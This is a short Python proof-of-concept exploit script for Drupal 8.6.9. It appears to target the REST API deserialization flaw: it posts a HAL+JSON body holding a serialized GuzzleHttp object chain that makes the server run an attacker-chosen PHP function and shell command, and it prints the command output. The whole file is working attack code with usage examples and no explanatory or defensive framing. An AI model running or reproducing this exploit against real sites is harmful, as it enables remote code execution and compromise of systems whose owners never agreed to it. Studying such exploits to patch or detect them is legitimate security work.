import requests, sys

if len(sys.argv) < 5:
  print "python poc.py [url] [php func] [command] [node number]\npython poc.py http://192.168.142.148/drupal-8.6.9/ system ipconfig 200" 
else:
  url = sys.argv[1]
  func = sys.argv[2]
  command = sys.argv[3]
  node = sys.argv[4]
  headers = {'Content-Type': 'application/hal+json'}
  jsonx = r'''{
    "_links": {
      "type": { "href": "%srest/type/shortcut/default"}
    },
    "link": [
      {
        "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:%d:\"%s\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:%d:\"%s\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}",
        "value": "link"
      }
    ]
  }'''%(url,len(command),command,len(func),func)

  r = requests.get('%snode/%s?_format=hal_json'%(url,node),allow_redirects=False,headers=headers,data=jsonx)
  print r.content.replace('"}]},','').replace('}]}],','').split("}]}",1)[1]